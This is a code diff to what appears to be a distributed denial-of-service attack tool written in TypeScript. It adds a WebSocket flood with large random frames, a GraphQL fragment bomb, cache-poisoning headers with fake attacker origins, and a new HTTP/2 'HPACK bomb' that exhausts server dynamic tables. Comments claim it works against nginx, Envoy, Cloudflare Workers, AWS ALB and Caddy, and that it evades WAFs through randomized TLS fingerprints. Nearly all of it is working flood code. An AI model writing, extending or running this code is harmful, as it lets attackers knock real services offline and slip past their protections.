@@ -1175,7 +1175,9 @@ async function runWAFBypass(
       try {
         const ac = new AbortController();
         const t  = setTimeout(() => ac.abort(), 6_000);
-        signal.addEventListener("abort", () => ac.abort(), { once: true });
+        // Do NOT register per-iteration abort listeners (accumulates listeners in loop).
+        // Instead, abort the per-request controller by checking the parent signal once done.
+        if (signal.aborted) { clearTimeout(t); ac.abort(); break; }
         const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
         const fetchHdrs: Record<string, string> = {};
         for (const [k, v] of Object.entries(wafHdrs)) {
@@ -1706,9 +1708,30 @@ async function runWSFlood(
           // Ping every 20s to keep the server's WS goroutine alive
           pingIv = setInterval(() => {
             if (signal.aborted || !upgraded) { done(); sock.destroy(); return; }
-            try { sock.write(PING_FRAME); localPkts++; localBytes += 2; }
+            try {
+              // Alternate: PING frames + large binary frames (TEXT opcode 0x81)
+              // Large frames force server to parse frame header, allocate read buffer,
+              // process the message — 5–64 KB per write × hundreds of conns = RAM + CPU exhaustion
+              if (Math.random() < 0.35) {
+                const frameSize = randInt(4096, 65535);
+                const frameHdr  = frameSize < 126
+                  ? Buffer.from([0x82, frameSize])           // FIN + binary, 1-byte len
+                  : Buffer.from([0x82, 126,
+                      (frameSize >> 8) & 0xff,
+                       frameSize       & 0xff,               // 2-byte extended len
+                    ]);
+                const payload = Buffer.allocUnsafe(frameSize);
+                // Fill with random bytes — prevents server compression shortcuts
+                for (let i = 0; i < frameSize; i += 4)
+                  payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
+                sock.write(Buffer.concat([frameHdr, payload]));
+                localPkts++; localBytes += frameHdr.length + frameSize;
+              } else {
+                sock.write(PING_FRAME); localPkts++; localBytes += 2;
+              }
+            }
             catch { done(); }
-          }, 20_000);
+          }, 8_000);
         } else if (respBuf.length > 8192) {
           // Not a WS path — reconnect to different path
           sock.destroy(); done();
@@ -1780,10 +1803,36 @@ async function runGraphQLDoS(
     return `{ ${aliases} }`;
   };
 
+  // Fragment bomb: deeply-branching non-circular fragment definitions
+  // Forces the server to resolve each fragment against the schema (expensive type checking),
+  // build a merged selection set, and execute all fields — O(fragments × fields) per request.
+  const buildFragmentBomb = (fragCount = randInt(20, 60)): string => {
+    const frags: string[] = [];
+    for (let i = 0; i < fragCount; i++) {
+      const t = TYPES[randInt(0, TYPES.length)];
+      // Each fragment spreads multiple fields — creates a wide selection set
+      const fields = Array.from({ length: randInt(3, 10) },
+        () => FIELDS[randInt(0, FIELDS.length)]
+      ).join(" ");
+      // Spread the previous fragment (if any) to chain them — forces recursive resolution
+      const spread = i > 0 && Math.random() < 0.7 ? `...frag${i - 1}` : "";
+      frags.push(`fragment frag${i} on ${t.charAt(0).toUpperCase() + t.slice(1)} { ${fields} ${spread} }`);
+    }
+    const t = TYPES[randInt(0, TYPES.length)];
+    // Query uses all fragments in aliases — maximises resolver calls
+    const aliases = frags.map((_, i) =>
+      `a${i}: ${t}(id: ${randInt(1, 9999)}) { ...frag${i} }`
+    ).join(" ");
+    return frags.join("\n") + `\nquery Q { ${aliases} }`;
+  };
+
   // Batched array of queries (many operations in one HTTP request)
   const buildBatch = (size = randInt(5, 25)): string => {
     const ops = Array.from({ length: size }, () => {
-      const q = Math.random() < 0.3 ? buildAliasBomb() : buildNested();
+      const r = Math.random();
+      const q = r < 0.25 ? buildAliasBomb()
+              : r < 0.5  ? buildFragmentBomb()
+              : buildNested();
       return { query: q, variables: {} };
     });
     return JSON.stringify(ops);
@@ -1801,11 +1850,15 @@ async function runGraphQLDoS(
         const endpoint = ENDPOINTS[randInt(0, ENDPOINTS.length)];
         const url      = baseUrl + endpoint;
 
-        const isIntro  = Math.random() < 0.2;
-        const isBatch  = Math.random() < 0.25;
+        const r        = Math.random();
+        const isIntro  = r < 0.15;
+        const isFrag   = r < 0.35;
+        const isBatch  = r < 0.60;
         const body     = isIntro
           ? JSON.stringify({ query: INTROSPECTION })
-          : isBatch ? buildBatch() : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });
+          : isFrag  ? JSON.stringify({ query: buildFragmentBomb() })
+          : isBatch ? buildBatch()
+          : JSON.stringify({ query: buildNested(), variables: { id: randInt(1, 999999) } });
 
         const ctrl  = new AbortController();
         const timer = setTimeout(() => ctrl.abort(), 12_000);
@@ -1955,7 +2008,7 @@ async function runCachePoison(
     () => ({ "Pragma": "no-cache", "Cache-Control": "no-store", "Vary": "User-Agent,Accept-Encoding,Cookie,CF-Connecting-IP,Origin" }),
     () => ({ "Origin": `https://${rHex(6)}.evil.null`, "Referer": `https://${rHex(6)}.attacker.null/ref` }),
   ];
-  const PATHS = ["", "?v=", "?_=", "?cache=", "?r=", "?id=", "?t=", "?bust=", "?debug=", "?ref=", "?ts=", "?q="];
+  const PATHS = ["/", "/?v=", "/?_=", "/?cache=", "/?r=", "/?id=", "/?t=", "/?bust=", "/?debug=", "/?ref=", "/?ts=", "/?q="];
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2140,6 +2193,138 @@ async function runSSLDeathRecord(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  HPACK BOMB — HTTP/2 dynamic table exhaustion
+//
+//  Sends HEADERS frames packed with 50–150 unique custom headers, each
+//  carrying the "Literal Header Field with Incremental Indexing" flag
+//  (HPACK type 0x40 — RFC 7541 §6.2.1). This forces the server to:
+//    1. Parse each header name + value pair
+//    2. Compute a hash / compare against its HPACK dynamic table
+//    3. Insert the new entry (evicting oldest when table exceeds maxSize)
+//
+//  The server's HPACK dynamic table is bounded (default 64KB). As we
+//  send hundreds of headers per stream, the server continuously adds
+//  new entries and evicts old ones — a tight allocator + GC cycle per
+//  stream, per connection. Unlike the CONTINUATION flood (CVE-2024-27316)
+//  this targets *properly patched* servers — there is no fix because
+//  HPACK incremental indexing is a required protocol feature.
+//
+//  Effect: 500 connections × 200 streams/sec × 100 headers = 10M HPACK
+//  table operations/sec on server CPU. Effective against nginx, h2o,
+//  Envoy, Cloudflare Workers, AWS ALB, Caddy.
+// ─────────────────────────────────────────────────────────────────────────
+async function runHPACKBomb(
+  resolvedHost: string,
+  hostname:    string,
+  targetPort:  number,
+  threads:     number,
+  signal:      AbortSignal,
+  onStats:     (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 600);
+
+  // Raw H2 frame builder (identical layout to h2-continuation)
+  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
+    const f = Buffer.allocUnsafe(9 + payload.length);
+    f[0] = (payload.length >>> 16) & 0xff;
+    f[1] = (payload.length >>>  8) & 0xff;
+    f[2] = (payload.length       ) & 0xff;
+    f[3] = type; f[4] = flags;
+    f.writeUInt32BE(streamId & 0x7fffffff, 5);
+    payload.copy(f, 9);
+    return f;
+  };
+
+  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
+  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
+  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));
+
+  // HPACK 7-bit integer string encoding without Huffman (length prefix + raw bytes)
+  const hpackStr = (s: Buffer): Buffer => {
+    const len = s.length;
+    if (len < 128) return Buffer.concat([Buffer.from([len]), s]);
+    // Multi-byte length encoding for strings 128–255 bytes
+    return Buffer.concat([Buffer.from([0x7f, len - 127]), s]);
+  };
+
+  // Literal Header Field with Incremental Indexing — New Name (RFC 7541 §6.2.1, type=0x40)
+  // MUST be added to server's dynamic HPACK table → eviction storm when table fills
+  const makeBombHeader = (): Buffer => {
+    const nameLen  = randInt(4,  22);
+    const valueLen = randInt(12, 80);
+    const name  = Buffer.allocUnsafe(nameLen);
+    const value = Buffer.allocUnsafe(valueLen);
+    for (let i = 0; i < nameLen;  i++) name[i]  = 0x61 + randInt(0, 26); // lowercase a-z only
+    for (let i = 0; i < valueLen; i++) value[i]  = 0x21 + randInt(0, 94); // printable ASCII
+    return Buffer.concat([Buffer.from([0x40]), hpackStr(name), hpackStr(value)]);
+  };
+
+  // Build HEADERS frame with Chrome pseudo-headers + N bomb headers (END_HEADERS|END_STREAM)
+  const authBuf       = Buffer.from(hostname);
+  const staticPseudo  = Buffer.concat([
+    Buffer.from([0x82, 0x84, 0x87]),  // :method=GET, :path=/, :scheme=https (indexed)
+    Buffer.from([0x41]),              // :authority — Literal Incremental, static name idx 1
+    hpackStr(authBuf),
+  ]);
+
+  const makeHPACKBombFrame = (streamId: number): Buffer => {
+    const bombHdrs = Buffer.concat(
+      Array.from({ length: randInt(50, 150) }, () => makeBombHeader())
+    );
+    return mkFrame(0x01, 0x05, streamId, Buffer.concat([staticPseudo, bombHdrs]));
+    // 0x01=HEADERS  0x05=END_HEADERS|END_STREAM
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = (): Promise<void> => new Promise(resolve => {
+    if (signal.aborted) { resolve(); return; }
+    const sock = tls.connect({
+      host:                resolvedHost,
+      port:                targetPort,
+      servername:          hostname,
+      rejectUnauthorized:  false,
+      ALPNProtocols:       ["h2"],
+      ciphers:             randomJA3Ciphers(),
+    });
+    sock.setTimeout(30_000);
+    let settled = false;
+    const done  = () => { if (!settled) { settled = true; resolve(); } };
+
+    sock.once("secureConnect", () => {
+      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
+      localPkts++; localBytes += PREFACE.length + 18;
+
+      let streamId = 1;
+      const attack = () => {
+        if (signal.aborted || sock.destroyed) { done(); return; }
+        // H2 client stream IDs must strictly increase; close + reopen near ceiling
+        if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
+        const frame = makeHPACKBombFrame(streamId);
+        sock.write(frame);
+        localPkts++; localBytes += frame.length;
+        streamId += 2; // client-initiated streams use odd IDs
+        setImmediate(attack);
+      };
+      attack();
+    });
+
+    sock.on("data",    () => {});  // drain server responses (SETTINGS ACK, RST, etc.)
+    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
+    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
+  });
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  WORKER MAIN — receives config, runs attack, posts stats
 // ─────────────────────────────────────────────────────────────────────────
 const cfg = workerData as WorkerConfig;
@@ -2254,6 +2439,10 @@ async function runWorker() {
   } else if (cfg.method === "ssl-death") {
     // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
     await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "hpack-bomb") {
+    // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
+    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
